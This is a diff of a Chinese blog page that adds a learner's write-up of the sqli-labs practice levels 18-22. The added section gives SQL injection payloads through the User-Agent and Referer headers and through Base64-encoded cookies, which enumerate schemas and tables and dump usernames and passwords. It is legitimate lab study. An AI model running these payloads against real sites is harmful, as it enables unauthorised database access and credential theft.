@@ -202,7 +202,9 @@
 <main class="app-body flex-box">
   <!-- Article START -->
   <article class="post-article">
-    <section class="markdown-content"><h4 id="Less18-19">Less18-19</h4>
+    <section class="markdown-content"><p>前段时间都去bugku上做题，本期继续学习sqli，把注入的内容做大做强，因为尝试了一下bugku的sql注入，做不来。</p>
+<span id="more"></span>
+<h4 id="Less18-19">Less18-19</h4>
 <p>Less18-19仍是POST方式下的sqli注入，执行的方式和函数与以前大致相同，但是发现不管是username还是password，用‘#都会报错，说明注入点不在这里。</p>
 <p>然后我们根据回显的提示可以知道回显点在哪里，并且在源码下echo助于我们阅读，接着我们需要添加<strong>modify header</strong>这个插件。注入的位置分别是：Less18在User-Agent，Less19在Referer。（账号密码要在正确的前提下）</p>
 <p><img src="/2021/10/19/sqli-labs-Less18-22/%E3%80%81%E3%80%81.png" alt></p>
@@ -212,6 +214,41 @@
 <p><img src="/2021/10/19/sqli-labs-Less18-22/96%E3%80%81.png" alt></p>
 <p>我们手工注入的代码如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Less18-19</span><br><span class="line">select updatexml(1,concat(0x7e,(database())),1); // 查库1</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(database())),1) or &#x27;1&#x27;=&#x27;1 // 闭合方式1</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(database())),1), &#x27;&#x27;,&#x27;&#x27;)# // 闭合方式2</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select schema_name from information_schema.schemata limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查库</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 表</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查列</span><br><span class="line">&#x27; or updatexml(1,concat(0x7e,(select id,username,password from security.users limit 0,1)),1), &#x27;&#x27;,&#x27;&#x27;)# // 查字段</span><br></pre></td></tr></table></figure>
+<h4 id="Less20-22">Less20-22</h4>
+<p>18和19关是将数据放在User-Agent和Referer中，借用到的插件是modify header；20-22则是将数据储存在cookie中，需要用到的插件则是<strong>Cookie Editor</strong>。那cookie是什么呢？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie：储存在用户本地终端上的数据，是一个保存在客户机中的简单的文本文件，通常经过加密。</span><br></pre></td></tr></table></figure>
+<p>就相当于是一个暂时储存终端数据的文本，储存后短时间内可以直接登陆，无需重复授权。</p>
+<p>由于20-22的内容都基本相同，差别就在后两关有Base64加密，我们以21关为实列。</p>
+<h5 id="页面熟悉">页面熟悉</h5>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/asd.png" alt></p>
+<p>可以看到有系统、浏览器、ip以及输入的账号密码等信息，这在cookie上也有显示，并且我们看到uname是一串经过Base64的加密文字（%3D等于=），解密后就是admin。同时也表明，接下来我们注入的内容都要先转换成base64的加密文字。</p>
+<h5 id="注入">注入</h5>
+<p>下面我们开始注入，还是’ ” ）三者的使用，我们先用‘发现存在注入，最有一一尝试知道’）为正确的注入方式。</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/75.png" alt></p>
+<p>然后将密文复制到cookie并保存，刷新返回以下界面</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/jh.png" alt></p>
+<p>判断正确与否是看下面有没有出现红色的jpg图片，有就说明对了！</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/jada.png" alt></p>
+<p>（注释：编码必须加上#）</p>
+<h5 id="查库">查库</h5>
+<p>上面是查询语句，下面是密文，在cookie上必须输入密文，下同</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,database()#</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw==</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/ku.png" alt></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(schema_name) from information_schema.schemata#</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoc2NoZW1hX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnNjaGVtYXRhIw==</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/quan.png" alt></p>
+<h5 id="查表">查表</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;#</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknIw==</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/hahaha.png" alt></p>
+<h5 id="查列">查列</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;)union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line">Jyl1bmlvbiBzZWxlY3QgMSwyLGdyb3VwX2NvbmNhdChjb2x1bW5fbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEuY29sdW1ucyB3aGVyZSB0YWJsZV9uYW1lPSd1c2Vycycj</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/aho.png" alt></p>
+<h5 id="查字段">查字段</h5>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(concat_ws(&#x27;=&#x27;,username,password))from security.users#</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29uY2F0X3dzKCc9Jyx1c2VybmFtZSxwYXNzd29yZCkpZnJvbSBzZWN1cml0eS51c2VycyM=</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/kaksad.png" alt></p>
+<p>由于~报错，改成=就正常了，不过用burpsuite没有发现~有被过滤掉。</p>
+<h4 id="问题">问题</h4>
+<p>由于只要我在源码中想显示$sql的内容，那么他就会出现以下报错，百度说可能是未打；等原因，但我连续三关都这样，只要一添加，就算后面再删除也会这样子，实属玄学，所以以后学习就不去显示sql在页面上了。</p>
+<p><img src="/2021/10/19/sqli-labs-Less18-22/55.png" alt></p>
 </section>
     <!-- Tags START -->
     
@@ -279,7 +316,7 @@
   <div class="toc-main">
     <strong class="toc-title">Catalog</strong>
     
-      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less18-19"><span class="toc-nav-text">Less18-19</span></a></li></ol>
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less18-19"><span class="toc-nav-text">Less18-19</span></a></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#Less20-22"><span class="toc-nav-text">Less20-22</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E9%A1%B5%E9%9D%A2%E7%86%9F%E6%82%89"><span class="toc-nav-text">页面熟悉</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-nav-text">注入</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9F%A5%E5%BA%93"><span class="toc-nav-text">查库</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9F%A5%E8%A1%A8"><span class="toc-nav-text">查表</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9F%A5%E5%88%97"><span class="toc-nav-text">查列</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#%E6%9F%A5%E5%AD%97%E6%AE%B5"><span class="toc-nav-text">查字段</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-4"><a class="toc-nav-link" href="#%E9%97%AE%E9%A2%98"><span class="toc-nav-text">问题</span></a></li></ol>
     
   </div>
 </aside>
